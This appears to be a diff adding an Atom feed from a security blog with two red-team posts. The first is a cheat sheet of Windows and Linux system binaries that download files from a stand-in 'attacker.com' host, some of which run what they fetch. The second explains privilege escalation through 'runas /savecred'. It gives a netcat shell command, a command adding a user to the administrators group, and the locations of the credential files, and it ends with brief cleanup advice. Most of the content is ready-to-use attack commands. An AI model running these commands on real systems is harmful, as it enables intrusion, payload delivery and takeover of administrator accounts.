@@ -1,0 +1,269 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Pebkac.ninja - pebkac</title><link href="www.pebkac.ninja/" rel="alternate"></link><link href="www.pebkac.ninja/feeds/pebkac.atom.xml" rel="self"></link><id>www.pebkac.ninja/</id><updated>2018-12-10T22:01:00+01:00</updated><entry><title>Remote File Copy all the things!</title><link href="www.pebkac.ninja/Remote_file_copy_all_the_things.html" rel="alternate"></link><published>2018-12-10T22:00:00+01:00</published><updated>2018-12-10T22:01:00+01:00</updated><author><name>pebkac</name></author><id>tag:None,2018-12-10:www.pebkac.ninja/Remote_file_copy_all_the_things.html</id><summary type="html">&lt;p&gt;Who has not run in to the issue of wanting to remote copy a file a file during Red-Team activities while having a low privilegde user. In this post i will mention multiple commands that make use of Windows and Linux binaries present on any system and can be used to download files on to a system under low priviledge.&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Background&lt;/h1&gt;
+&lt;p&gt;While playing a CTF I had to copy files from one machine to the next. However I was not able to do so with a non standard binary. A few, weeks, months ago, really don't remember. I watched a talk where these 2 projects being presented. These project basicly showed a lot of research being done on system binaries that can be used during Red-Team activities. Ofcourse these can also be added to your forensic artefact list should you be interested in preventing them from being used.
+&lt;br&gt; 
+&lt;br&gt;&lt;/p&gt;
+&lt;h2&gt;Windows&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://lolbas-project.github.io/" title="Lolbas-project"&gt;Lolbas-project&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Linux&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://gtfobins.github.io/" title="GTFO-bins"&gt;GTFO-bins&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;br&gt;
+From these websites I found multiple other binaries that could do remote file copy and so much more. I highly recommend looking them up. To make it easier for myself and maybe you? next time we might need them I copied some of command in this post for easy access. (All credits go to the researchers of those 2 great projects)
+&lt;br&gt;
+&lt;br&gt;&lt;/p&gt;
+&lt;h1&gt;Windows&lt;/h1&gt;
+&lt;h3&gt;bitsadmin&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;bitsadmin /create 1 bitsadmin /addfile 1 &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;url&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;/file.ext&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &amp;lt;output Folder&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;\file.ext bitsadmin /RESUME 1 bitsadmin /complete 1
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;certutil&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;certutil.exe -urlcache -split -f &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;url&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;/file.ext &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;outputFile.ext&amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Esentutl&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;esentutl.exe /y \\&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;url without www&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;\&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;file.ext&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; /d \\otherwebdavserver\webdav\adrestore.exe /o
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Expand&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;expand \\webdav\folder\file.bat c:\ADS\file.bat
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Extrac32&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Findstr&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;findstr /V /L mip9-2rnuar;gl934gmlkj \\webdavserver\folder\file.exe &lt;span class="p"&gt;&amp;gt;&lt;/span&gt; c:\ADS\file.exe
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Hh&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HH.exe http://some.url/script.ps1
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Ieexec&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ieexec.exe http://x.x.x.x:8080/bypass.exe
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Makecab&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Replace&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;br&gt;
+&lt;br&gt;&lt;/p&gt;
+&lt;h1&gt;Linux&lt;/h1&gt;
+&lt;h3&gt;Bash&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;RHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;attacker.com
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;RPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;12345&lt;/span&gt;
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;LFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;file_to_get
+bash -c &lt;span class="s1"&gt;&amp;#39;{ echo -ne &amp;quot;GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n&amp;quot; 1&amp;gt;&amp;amp;3; cat 0&amp;lt;&amp;amp;3; } \&lt;/span&gt;
+&lt;span class="s1"&gt;    3&amp;lt;&amp;gt;/dev/tcp/$RHOST/$RPORT \&lt;/span&gt;
+&lt;span class="s1"&gt;    | { while read -r; do [ &amp;quot;$REPLY&amp;quot; = &amp;quot;$(echo -ne &amp;quot;\r&amp;quot;)&amp;quot; ] &amp;amp;&amp;amp; break; done; cat; } &amp;gt; $LFILE&amp;#39;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Remote file using a TCP connection. Run nc -l -p 12345 &amp;lt; "file_to_send" on the attacker box &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;RHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;attacker.com
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;RPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;12345&lt;/span&gt;
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;LFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;file_to_get
+bash -c &lt;span class="s1"&gt;&amp;#39;cat &amp;lt; /dev/tcp/$RHOST/$RPORT &amp;gt; $LFILE&amp;#39;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;CPAN&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://attacker.com/file_to_get
+cpan
+! use File::Fetch&lt;span class="p"&gt;;&lt;/span&gt; my &lt;span class="nv"&gt;$file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;File::Fetch-&amp;gt;new&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;uri&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$ENV&lt;/span&gt;&lt;span class="s2"&gt;{URL}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;-&amp;gt;fetch&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;curl&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://attacker.com/file_to_get
+&lt;span class="nv"&gt;LFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;file_to_save
+curl &lt;span class="nv"&gt;$URL&lt;/span&gt; -o &lt;span class="nv"&gt;$LFILE&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;easy_install&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://attacker.com/file_to_get
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;LFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp/file_to_save
+&lt;span class="nv"&gt;TF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;mktemp -d&lt;span class="k"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import os;&lt;/span&gt;
+&lt;span class="s2"&gt;os.execl(&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;whereis python&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;whereis python&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39;, &amp;#39;-c&amp;#39;, \&amp;quot;\&amp;quot;\&amp;quot;import sys;&lt;/span&gt;
+&lt;span class="s2"&gt;if sys.version_info.major == 3: import urllib.request as r&lt;/span&gt;
+&lt;span class="s2"&gt;else: import urllib as r&lt;/span&gt;
+&lt;span class="s2"&gt;r.urlretrieve(&amp;#39;&lt;/span&gt;&lt;span class="nv"&gt;$URL&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;&lt;span class="nv"&gt;$LFILE&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39;)\&amp;quot;\&amp;quot;\&amp;quot;)&amp;quot;&lt;/span&gt; &amp;gt; &lt;span class="nv"&gt;$TF&lt;/span&gt;/setup.py
+pip install &lt;span class="nv"&gt;$TF&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;GDB&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://attacker.com/file_to_get
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;LFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;file_to_save
+gdb -nx -ex &lt;span class="s1"&gt;&amp;#39;python import sys; from os import environ as e&lt;/span&gt;
+&lt;span class="s1"&gt;if sys.version_info.major == 3: import urllib.request as r&lt;/span&gt;
+&lt;span class="s1"&gt;else: import urllib as r&lt;/span&gt;
+&lt;span class="s1"&gt;r.urlretrieve(e[&amp;quot;URL&amp;quot;], e[&amp;quot;LFILE&amp;quot;])&amp;#39;&lt;/span&gt; -ex quit
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;NMAP&lt;/h3&gt;
+&lt;p&gt;Run nc target.com 12345 &amp;lt; "file_to_send" on the attacker &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;12345&lt;/span&gt;
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;LFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;file_to_save
+&lt;span class="nv"&gt;TF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;mktemp&lt;span class="k"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;local k=require(&amp;quot;socket&amp;quot;);&lt;/span&gt;
+&lt;span class="s1"&gt;  local s=assert(k.bind(&amp;quot;*&amp;quot;,os.getenv(&amp;quot;LPORT&amp;quot;)));&lt;/span&gt;
+&lt;span class="s1"&gt;  local c=s:accept();&lt;/span&gt;
+&lt;span class="s1"&gt;  local d,x=c:receive(&amp;quot;*a&amp;quot;);&lt;/span&gt;
+&lt;span class="s1"&gt;  c:close();&lt;/span&gt;
+&lt;span class="s1"&gt;  local f=io.open(os.getenv(&amp;quot;LFILE&amp;quot;), &amp;quot;wb&amp;quot;);&lt;/span&gt;
+&lt;span class="s1"&gt;  f:write(d);&lt;/span&gt;
+&lt;span class="s1"&gt;  io.close(f);&amp;#39;&lt;/span&gt; &amp;gt; &lt;span class="nv"&gt;$TF&lt;/span&gt;
+nmap --script&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$TF&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;php&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://attacker.com/file_to_get
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;LFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;file_to_save
+php -r &lt;span class="s1"&gt;&amp;#39;$c=file_get_contents(getenv(&amp;quot;URL&amp;quot;));file_put_contents(getenv(&amp;quot;LFILE&amp;quot;), $c);&amp;#39;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;whois&lt;/h3&gt;
+&lt;p&gt;Run nc -l -p 12345 &amp;lt; "file_to_send" on the attacker box&lt;br&gt;
+The file has instances of $'\x0d' stripped.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;RHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;attacker.com
+&lt;span class="nv"&gt;RPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;12345&lt;/span&gt;
+&lt;span class="nv"&gt;LFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;file_to_save
+whois -h &lt;span class="nv"&gt;$RHOST&lt;/span&gt; -p &lt;span class="nv"&gt;$RPORT&lt;/span&gt; &amp;gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$LFILE&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Run base64 "file_to_send" | nc -l -p 12345 on the attacker box&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;RHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;attacker.com
+&lt;span class="nv"&gt;RPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;12345&lt;/span&gt;
+&lt;span class="nv"&gt;LFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;file_to_save
+whois -h &lt;span class="nv"&gt;$RHOST&lt;/span&gt; -p &lt;span class="nv"&gt;$RPORT&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; base64 -d &amp;gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$LFILE&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Python&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://attacker.com/file_to_get
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;LFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;file_to_save
+python -c &lt;span class="s1"&gt;&amp;#39;import sys; from os import environ as e&lt;/span&gt;
+&lt;span class="s1"&gt;if sys.version_info.major == 3: import urllib.request as r&lt;/span&gt;
+&lt;span class="s1"&gt;else: import urllib as r&lt;/span&gt;
+&lt;span class="s1"&gt;r.urlretrieve(e[&amp;quot;URL&amp;quot;], e[&amp;quot;LFILE&amp;quot;])&amp;#39;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;</content><category term="Red-Team"></category><category term="MITRE-Attack:T1105"></category><category term="Remote File Copy"></category><category term="Lateral Movement"></category></entry><entry><title>RUNAS ftw!</title><link href="www.pebkac.ninja/RUNAS_administrator.html" rel="alternate"></link><published>2018-12-09T22:00:00+01:00</published><updated>2018-12-09T22:01:00+01:00</updated><author><name>pebkac</name></author><id>tag:None,2018-12-09:www.pebkac.ninja/RUNAS_administrator.html</id><summary type="html">&lt;p&gt;A while ago I was playing a CTF, &lt;strong&gt;RUNAS&lt;/strong&gt; was one of the ways to run a &lt;strong&gt;cmd.exe&lt;/strong&gt; process with elevated privilege. This sounds basic but it never occured to me to use it for privilegde escalation so I decided to play around with it some more.&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Background&lt;/h1&gt;
+&lt;p&gt;A while ago I was playing a CTF, where I had to use &lt;strong&gt;RUNAS&lt;/strong&gt; as a ways to run a &lt;strong&gt;cmd.exe&lt;/strong&gt; process with elevated privilege.
+This sounds basic but it never occured to me to use it for privilegde escalation so I decided to play around with it some more, but when you think about it.&lt;br /&gt;&lt;br /&gt;How many users/sysadmins are not tired of entering their password everytime you need to start a process with administrator privilege. Selecting the &lt;strong&gt;save creditials&lt;/strong&gt; checkbox is way of making your life easier. Ofcourse every sysadmin, developer or cyber security professional knows &lt;strong&gt;NOT&lt;/strong&gt; to do this.&lt;br /&gt;&lt;br /&gt;But after playing with it, I found it happens more often than you might think.&lt;br /&gt; Thus creating opportunity for attackers.&lt;/p&gt;
+&lt;h1&gt;The command used&lt;/h1&gt;
+&lt;p&gt;When we look at the documentation of the &lt;strong&gt;RUNAS&lt;/strong&gt; command you get the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;RUNAS
+Execute a program under a different user account (non-elevated).
+
+Syntax
+      RUNAS [ [/noprofile &lt;span class="p"&gt;|&lt;/span&gt; /profile] [/env] [/savecred &lt;span class="p"&gt;|&lt;/span&gt; /netonly] ]
+         /user:UserName program
+
+      RUNAS [ [/noprofile &lt;span class="p"&gt;|&lt;/span&gt; /profile] [/env] [/savecred] ]
+         /smartcard [/user:UserName] program
+
+      Display the trust levels that can be used:
+      RUNAS /showtrustlevels
+
+      Run a program at a given TrustLevel:
+      RUNAS /trustlevel:TrustLevel program
+
+Key
+   /noprofile       Do not load the user&amp;#39;s profile.
+                    This causes the application to load more quickly, but
+                    can cause some applications to malfunction.
+
+   /profile         Load the user&amp;#39;s profile. (default)
+
+   /env             Use the current environment instead of user&amp;#39;s.
+
+   /netonly         Use the credentials for remote access only.
+
+   /savecred        Use credentials previously saved by the user.
+                    This option is not available on Windows 7 Home or
+                    Starter Editions and will be ignored.
+
+   /smartcard       Load the credentials from a smartcard.
+
+   /user            UserName in the form USER@DOMAIN or DOMAIN\USER
+
+   /trustlevel Level  One of levels enumerated in /showtrustlevels.
+                      RunAs is not able to launch an application with an elevated
+                      access token.
+
+   program          The program to run.
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;How does this work you ask ?&lt;/h1&gt;
+&lt;p&gt;What makes this possible is the &lt;strong&gt;/savecred&lt;/strong&gt; key that can be used if the user has previously selected the &lt;strong&gt;save credentials&lt;/strong&gt; checkbox when running a process as a different user. The Second place I found this to be true is the &lt;strong&gt;Developer mode&lt;/strong&gt; in windows 10 which is awesome because there are some developers in a company that will turn this on. Keep in mind that there are exeptions when GPO is applied etc. However these hosts will sometimes hold .txt files with credentials to the production enviroment. You can only imagine why these are interesting for an attacker.&lt;/p&gt;
+&lt;h1&gt;The Scenario&lt;/h1&gt;
+&lt;p&gt;Microsoft Windows will sometimes give you a pop-up if you need to run something as a different or privileged user and Let's be honest it's just easier to check the box so that you don't have to do this over and over again during testing. After this the user has saved the administrator credentials to the Windows Credential Manager&lt;br /&gt;
+However the user may forget to clear the saved credential database afterwards. 
+&lt;br /&gt;
+&lt;br /&gt;
+So eventhough the documentation states &lt;strong&gt;(non-elevated)&lt;/strong&gt; you might just want to try this when you need escalate privilegde during Red-Team activities.&lt;/p&gt;
+&lt;h1&gt;How to use&lt;/h1&gt;
+&lt;p&gt;I found 3 options that worked while I was testing but there are more when you go down the rabbit hole.&lt;br /&gt;&lt;/p&gt;
+&lt;h2&gt;Reverse-shell&lt;/h2&gt;
+&lt;p&gt;This works if you have copied a executable like netcat (nc) on the system first.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;runas /noprofile /user:&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;computername&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;\Administrator /savecred &lt;span class="s2"&gt;&amp;quot;nc -lvp 4444 -e cmd.exe&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Adding your low privilegde user to the administrators group&lt;/h2&gt;
+&lt;p&gt;This might mean you need to restart your shell before it takes affect.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;runas /noprofile /user:&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;computername&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;\Administrator /savecred &lt;span class="s2"&gt;&amp;quot;net localgroup administrators &amp;lt;username&amp;gt; /add&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Opening a file that has a different owner&lt;/h2&gt;
+&lt;p&gt;Don't forget to escape the pair of double quotes ;-)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Runas /noprofile /user:&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;computername&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;\Administrator /savecred &lt;span class="s2"&gt;&amp;quot;notepad \&amp;quot;&lt;/span&gt;C:\work\demo file.txt\&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In theory you could change the local computername for a domain if you want to test this in a corporate enviroment.&lt;/p&gt;
+&lt;h1&gt;Other means of attack&lt;/h1&gt;
+&lt;p&gt;However these results raised more questions, where are these password stored? is there a way of decrypting them to harvest the credentials after you gained a privileged shell. I was fortunate enough to talk to a colleague who pointed me towards a tool from nirsoft. &lt;a href="https://www.nirsoft.net/utils/credentials_file_view.html" title="Nirsoft credential file viewer"&gt;Nirsoft's CredentialsFileView&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2&gt;Database locations&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;C&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;\Users\[User_Profile]\AppData\Roaming\Microsoft\Credentials&lt;/span&gt;&lt;span class="c1"&gt; (Windows Vista and later)&lt;/span&gt;
+C&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;\Users\[User_Profile]\AppData\Local\Microsoft\Credentials&lt;/span&gt;&lt;span class="c1"&gt; (Windows Vista and later)&lt;/span&gt;
+C&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Credentials&lt;/span&gt;&lt;span class="c1"&gt; (Windows 8 and later)&lt;/span&gt;
+C&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;\Documents_and_Settings\[User_Profile]\Application_Data\Microsoft\Credentials&lt;/span&gt;&lt;span class="c1"&gt; (Windows XP)&lt;/span&gt;
+C&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;\Documents_and_Settings\[User_Profile]\Local_Settings\Application_Data\Microsoft\Credentials&lt;/span&gt;&lt;span class="c1"&gt; (Windows XP)   &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;Clearing the database&lt;/h1&gt;
+&lt;p&gt;I think its only fair if I tell you how to clear the database of these saved credentials.&lt;br /&gt;
+Especially because it only takes 3 steps.&lt;br /&gt;&lt;br /&gt;
+1. Click Start &amp;gt; Control Panel &amp;gt; User Accounts &amp;gt; Credential Manager.&lt;br /&gt;
+2. Select the Windows Credentials option.&lt;br /&gt;
+3. Then click Remove from Vault or Remove (depending upon which version of Windows you are running).&lt;br /&gt;&lt;/p&gt;</content><category term="Red-Team"></category><category term="priv-esc"></category><category term="MITRE-Attack:T1134"></category><category term="Access Token Manipulation"></category></entry></feed>
